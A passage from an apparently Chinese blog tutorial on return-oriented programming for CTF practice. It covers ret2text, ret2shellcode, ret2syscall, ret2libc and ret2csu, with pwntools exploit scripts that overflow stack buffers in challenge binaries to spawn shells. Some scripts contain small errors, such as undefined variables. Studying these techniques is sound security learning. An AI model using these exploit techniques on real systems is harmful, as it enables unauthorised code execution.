src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-00-09.png"></p><blockquote><p>64位系统中rdi，rsi，rdx，rcx，r8，r9作为调用函数的前6个参数，如果参数多于6个，其余参数放入栈中。与此对比，32位系统中由于寄存器有限，调用函数时参数都放入栈中</p></blockquote><p>找一个变量双击可以看到各个变量对应的虚拟内存地址，构造playload就可以先用0x70个自节填满s变量，再用8个字节填满r，最后加上&#x2F;bin&#x2F;sh的地址。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-06-55.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-e20ddfc12b209019.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">34749</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span> + <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x4007B8</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;Welcome to CTFHub ret2text.Input someting:\n&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>‘+4’ 是因为32位程序要覆盖的ebp是四个字节，64位程序需要覆盖八字节的rbp</p></blockquote><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>就是篡改栈帧上的返回地址为攻击者手动传入的shellcode所在缓冲区地址。我们可以利用pwntools中的shellcraft.sh()编写shellcode。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h4 id="🌰-1-1"><a href="#🌰-1-1" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>点击下载题目: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>查看文件信息：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-40-56.png"></p><p>进入main函数反编译一下：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-46-07.png"></p><p>发现gets和strncpy存在栈溢出漏洞，但系统没有现成的‘bin&#x2F;sh’指令给我们用。我们要自己写🥲</p><p>那怎么写呢？这时就要请出我们的得力助手pwntools，在pwntools下可以自动生成shellcode脚本。</p><p>gets获得输入的s变量，并将其复制到buf2处。双击buf2可以跳转到其所在位置，我们发现buf2在.bss段，所在段地址为0x0804a080</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-49-27.png"></p><p>调试下程序，看看这一个 bss 段是否可执行，显示rwxp就是可以。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_11-02-42.png"></p><p>有权限就意味着我们可以将shellcode通过strncpy函数放进buf2这个区域，在触发溢出后将返回地址指向buf2这里即可拿到shell。</p><p>确定要覆盖的 return address 的偏移量相对于栈顶为 112 个字节。</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2-1"><a href="#🌰-2-1" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>还是CTFHub的题目。放进ubuntu查看文件信息：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-00-41.png"></p><p>NX disabledz，即将shellcode放在数据段，即可执行</p><p>出现了一个新的变量RWX！</p><p>用IDA反编译题目main函数发现栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-03-42.png"></p><p>我们可以知道buf相对于ebp的偏移量是0x10，所以我们需要填充(0x10+8)的数据。</p><p>双击buf查看程序中的变量信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-14_20-33-36.png"></p><p>r即为返回地址，有0x8的偏移量，所以总共需要填充的数据长度是 (0x10+0x8+0x8)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-a0bc34814de46f67.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">37477</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;[&#x27;</span>)<br>buf_address = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;]&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(buf_address).upper())<br>shellcode_address = buf_address+<span class="hljs-number">0x20</span> <span class="hljs-comment"># buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8</span><br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(shellcode_address).upper())<br>shellcode = asm(shellcraft.sh())<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span> + <span class="hljs-number">4</span>) + p64(shellcode_address) + shellcode<br>io.recv()<br>io.sendline(payload)<br>io.interactive()     <br></code></pre></td></tr></table></figure><blockquote><p>这也太深奥了没搞懂，有缘再说</p></blockquote><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>ret2syscall即控制程序执行系统调用，从而获取shell。前提是程序需要有int 0x80这样的系统调用的gadget.</p><p>在ret2shellcode的情境下，如果开启了NX，那我们写到栈中的shellcode就会被CPU报错而不可执行。这种情况下，我们可以尝试使用ret2syscall的方法。</p><p>ret2syscall就是指通过手机带有ret指令的指令片段拼接成我们需要的shellcode。</p><blockquote><p>ret 指令可以理解为取栈顶的数据作为下次跳转的位置，即 eip&#x3D;[esp]  esp&#x3D;[esp+4]</p><p>或者理解为 pop eip，jmp   </p><p>取栈顶数据作为下次跳转的位置，然后跳转;</p><p>同理call也可以理解为 push rip, jmp  </p><p>将call指令的下一条指令地址压入栈，然后跳转</p></blockquote><h4 id="🌰"><a href="#🌰" class="headerlink" title="🌰:"></a>🌰:</h4><p> bamboofox 中的 ret2syscall </p><p>首先检测程序开启的保护：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-47-19.png"></p><p>查看其源码寻找利用点：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-48-31.png"></p><p>main 函数里有 gets 可以实现栈溢出，计算偏移量为112。</p><p>接下来进行系统调用构造，利用ROPgadget查找对应的gadget：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-23-31.png"></p><p>选择0x080bb196的这段</p><p>同样，找到其他的gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-26-17.png"></p><p>这里可以同时控制三个寄存器，我们选它</p><p>选好所有的gadgets就拼接起来构造payload就好喽</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/OMFuQ4/rop&#x27;</span>)  //这文件我直接拖进去的文件地址好长<br><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806eb90</span><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, pop_edx_ecx_ebx, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh,pop_eax, <span class="hljs-number">0xb</span>, int_0x80])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="关于linux系统调用的实现"><a href="#关于linux系统调用的实现" class="headerlink" title="关于linux系统调用的实现"></a>关于linux系统调用的实现</h4><h5 id="系统调用的步骤"><a href="#系统调用的步骤" class="headerlink" title="系统调用的步骤"></a>系统调用的步骤</h5><p>Linux的系统调用需要通过 int 80 实现，用系统调用号来区分入口函数。操作系统实现调用的基本过程如下：</p><ul><li>应用程序调用库函数</li><li>API将系统调用号存入EAX，然后通过中断调用时系统进入内核态</li><li>内核中的中断处理函数根据系统调用号，调用到对应的内核函数（系统调用）</li><li>系统调用完成相应的功能，将返回值存入EAX，返回到中断处理函数</li><li>中断处理函数返回到API</li><li>API将EAX返回给应用程序</li></ul><blockquote><p>系统调用号：</p><p>在Linux系统中，每个系统调用都被赋予一个系统调用号。系统调用号一旦分配就不能再有任何变更，否则编译好的应用程序就会崩溃；此外，如果一个系统调用被删除，它所占用的系统调用号也不允许被回收利用。这样，通过系统调用号就可以关联系统调用。</p><p>比如32位下调用 execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) ，Linux系统调用通过int 0x80指令开始系统调用，exceve对应的系统调用号是0xb</p></blockquote><h5 id="举个栗子🌰："><a href="#举个栗子🌰：" class="headerlink" title="举个栗子🌰："></a>举个栗子🌰：</h5><p>函数<code>execve(&quot;/bin/sh&quot;,null,null)</code></p><p>其函数调用过程应该是：</p><ul><li>系统调用号存入EAX，即eax应该是0xb</li><li>依次传入三个参数，即ebx指向&#x2F;bin&#x2F;sh的地址或者sh的地址；ecx为0；edx为0</li></ul><p>我们可以知道系统在调用时会用到eax，ebx，ecx，edx四个寄存器，那么我们就可以将以上的内容写为<code>int 0x80(eax,ebx,ecx,edx)</code>。只要把对应的参数放到相应的寄存器中，再执行int 0x80就可以执行相应的系统调用。</p><p>那该怎么控制呢？🤨 <del>把刀架在寄存器脖子上</del></p><p>我们们可以使用pop和ret指令组合来控制寄存器的值以及执行方向。</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>ROPgadget和ropper，两个都可可以找，目标汇编代码片段，ROPgadget速度更快但是查找结果并不完整；ropper速度相对较慢但查找结果精准。</p><p>对于静态生成的程序，我们可以不用每一次都一条一条的去找命令，可以直接生成一条ROP链</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">ropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execverropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execve</span><br><span class="hljs-comment">ROPgadget</span> <span class="hljs-literal">--</span><span class="hljs-comment">binary inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">ropchain</span><br></code></pre></td></tr></table></figure><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>ret2libc即控制函数执行libc中的函数，通常是返回值某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容）。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，我们需要知道 system 函数的地址。</p><h4 id="🌰-1-2"><a href="#🌰-1-2" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>CTF Wiki 的题，超简单的所有信息都给出的新手题目 <del>我都会做</del></p><p>首先查看安全保护</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-39-30.png"></p><p>源程序为 32 位，开启了 NX 保护。看一下程序源代码，确定栈溢出利用位置</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-42-44.png"></p><p>gets可以栈溢出。</p><p>我们可以找到system函数和’bin&#x2F;sh’字符串</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-46-14.png"></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-48-21.png"></p><p>我们就可以直接返回 system 的地址</p><p>计算偏移量为112，构造payload。需要注意，我们调用system函数，会有一个对应的四字节的返回地址，我们需要将其填充后再附上我们的 ‘&#x2F;bin&#x2F;sh’ 字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process( <span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/Cm8v0D/ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br><br>payload=flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh_addr])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2-2"><a href="#🌰-2-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>同样是32位的程序开启NX保护，有一个gets可以利用。有system函数但没有 ‘&#x2F;bin&#x2F;sh’ 字符串，但是有一个gets()函数，我们可以自己读取。同时我们在.bss段发现一个buf可以传参，可以把字符串填在这里</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-44-44.png"></p><p>编写exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>r=process(&#x27;/var/run/vmblock-fuse/blockdir/wD0Lp7/ret2libc2&#x27;)<br><br>buf_addr = 0x804A080<br>gets_addr = 0x8048460<br>sys_addr = 0x8048490<br><br>payload = flat( [&#x27;A&#x27;*112, gets_addr, sys_addr, buf_addr, buf_addr] )<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>payload解释：</p><ul><li><code>&#39;A&#39;*112</code>：填充112个字符’A’溢出缓冲区，覆盖返回地址。</li><li><code>gets_addr</code>：将<code>gets</code>函数的地址作为原本程序的gets()函数的返回地址，控制程序流程跳转到<code>gets</code>函数。</li><li><code>sys_addr</code>：<code>system</code>函数的地址，将作为<code>gets</code>函数返回后的下一个地址，控制程序流程跳转到<code>system</code>函数。</li><li><code>buf_addr</code>：缓冲区的地址，作为<code>system</code>函数的参数，传递给<code>system</code>函数的命令字符串所在的内存地址。</li><li><code>buf_addr</code>：再次使用缓冲区的地址，作为<code>gets</code>函数的参数，使得<code>gets</code>函数将用户输入的命令字符串写入到缓冲区。</li></ul><h4 id="🌰-3"><a href="#🌰-3" class="headerlink" title="🌰_3:"></a>🌰_3:</h4><p>这次system也没了🤨，其他的保护和漏洞都和例一例二一样。除此之外，题目中又给了一个 libc.so 动态链接库。</p><p>那怎么得到system的地址呢？</p><p>补课时间到！</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>除此之外我们还要知道，A 真实地址 (内存物理地址) - A 偏移地址 &#x3D; B 真实地址 (内存物理地址) -B 偏移地址 &#x3D; 基地址。也就是说，<strong>B的真实地址&#x3D;基地址+B的偏移地址</strong>。</p><p><strong>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</strong></p><p>那该如何获得已知函数的地址呢？</p><p>got表泄露！输出某个函数对应的got表内容，注意libc的延迟绑定机制，got表中只有已经执行过的函数有真实地址，我们需要泄露已经执行过的函数地址。再在程序中查询偏移进一步获得system地址。</p><p>但是！这样太麻烦啦我们可以用工具：<a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a> </p><p>exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>sh = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>got_puts = elf.got[&#x27;puts&#x27;]<br>got_libc_startmain = elf.got[&#x27;__libc_start_main&#x27;]<br>main = elf.symbols[&#x27;main&#x27;]<br><br>payload1 = flat( [b&#x27;A&#x27;*112, puts_plt, main, got_puts] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload1)<br>puts_addr = u32(sh.recv(4))<br><br><span class="hljs-comment"># libc6_2.27-3ubuntu1.2_i386</span><br>libc_puts = 0x67c10 <span class="hljs-comment">#offset</span><br>libc_system = 0x3d250<br>libc_binsh = 0x17e3cf<br><br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br>binsh_addr = libc_base + libc_binsh<br><br>payload2 = flat( [b&#x27;A&#x27;*112, system_addr, 0xcafebabe, binsh_addr] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload2)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>了解ret2csu之前先了解一下attached code的概念。</p><p>我们编译一个简单的只有一个main函数的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">include&lt;stdio.h&gt;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(jint argc,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看可执行文件的函数符号：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nm</span> -<span class="hljs-keyword">a</span> [filename] | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;t\|T&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-37-10.png"></p><p>可以发现除了 main 函数还有很多其它函数，这些函数是编译器附加到可执行文件中的，称之为 attached code 。这些 attached code 在main 函数之前执行，负责加载或者链接库文件。我们可以从 attached code 中寻找可以利用的 gadgets。</p><p>我们利用 <code>objdum -D [filename] </code>命令查看文件反汇编代码可以看到 <code>__libc_csu_init()</code> 函数中存在以下gadget：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-50-34.png"></p><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 <code>__libc_csu_init</code> 中的 gadgets。我们可以在执行完第二个gadget后ret到第一个gadget，这样就可以控制很多关键寄存器的值。</p><p>需要注意的是，这种方法不能控制rax的值，也就无法进行系统调用，因为系统调用号在rax里。但我们可以通过write等函数泄露got表中的函数地址，然后计算出libc地址。</p><p>有以下几种利用场景：</p><ul><li>ret2csu泄露libc地址后利用libc中的gadget</li><li>ret2csu配合pop rax;syscall;等gadget直接getshell</li><li>开启pie的情况下，利用offset2lib进行ret2csu,或者直接利用libc中的gadget getshell</li></ul><blockquote><p>offset2lib简单来说就是泄露任意代码段地址即可推得所有共享库地址,因为共享库之间的offset是固定的.</p></blockquote><h4 id="🌰-1-3"><a href="#🌰-1-3" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>题目链接：<a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5%E3%80%82">https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5。</a></p><p>题目没有开启pie和canary保护。</p><p>蒸米师傅给了源码，我们自己拖到 ida 里也能判断出代码的基本逻辑，main() 函数里还有一个 <code>vulnerable_function()</code> 函数 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];<br>read(STDIN_FILENO, buf, <span class="hljs-number">512</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>write(STDOUT_FILENO, <span class="hljs-string">&quot;Hello, World/n&quot;</span>, <span class="hljs-number">13</span>);<br>vulnerable_function();<br>&#125;<br></code></pre></td></tr></table></figure><p>在read处有明显的栈溢出可以利用。<code>.plt</code> 表里就只有write函数和read函数。</p><p>我们的目的是调用 <code>system(&quot;/bin/sh&quot;)</code> ，可以先泄露出libc函数的地址，用write打印出来，通过计算偏移就可以求出system函数的地址。然后使用read函数将真实的system函数地址和&#x2F;bin&#x2F;sh字符串写入bss段，最后调用system函数即可。</p><p>我们知道在64位的程序中，前六个参数使用寄存器RDI, RSI, RDX, RCX, R8和 R9传递</p><p>在__libc_csu_init()函数中有可以利用的gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-19_10-16-23.png"></p><p>我们控制rbx,rbp,r12,r13,r14和r15的值，再将r15的值赋值给rdx，r14的值赋值给rsi，r15的值赋值给edi。简单来说对应关系就是:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rdi</span>=  <span class="hljs-built_in">edi</span> = <span class="hljs-built_in">r13</span>,  <span class="hljs-built_in">rsi</span> = <span class="hljs-built_in">r14</span>, <span class="hljs-built_in">rdx</span> = <span class="hljs-built_in">r15</span><br></code></pre></td></tr></table></figure><p>随后就会调用 <code>call qword ptr [r12+rbx*8]</code> 。这条指令的含义是向 <code>[r12+rbx*8]</code> 间接寻址，跳转到所指的函数地址。我们就可以将rbx赋值为0，这样的寻址结果就是r12所指向的地址。</p><p>接下来的汇编代码片段含义为：执行call指令结束后，程序对rbx加一，然后对比rbx和rbp的值，如果相等就会继续向下执行。为了让rbx和rbp相等，我们需要将rbp赋值为1。</p><ul><li>payload-1</li></ul><p>利用 <code>read()</code> 读入我们的payload，<code>write()</code> 输出其got表中的地址。除了泄露地址，为了返回到原程序中重复利用 <code>buffer overflow</code> 的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p><p>总结一下我们要实现的payload需求：<code>rbx=0,rbp=1,r12=write_address,rdi=edi=r13,rsi=r14,rdx=r15</code>，<code>write(1,write_got,8)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">csu_end</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400606</span><br><span class="hljs-variable">csu_front</span> = <span class="hljs-number">0</span><span class="hljs-variable">x4005F0</span><br><span class="hljs-variable">got_write</span> = <span class="hljs-variable">level5.got</span>[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-variable">main_address</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400564</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>write(1,write_got,8) 的含义为将 writ 函数的地址写入标准输出流中，写入的字节数为 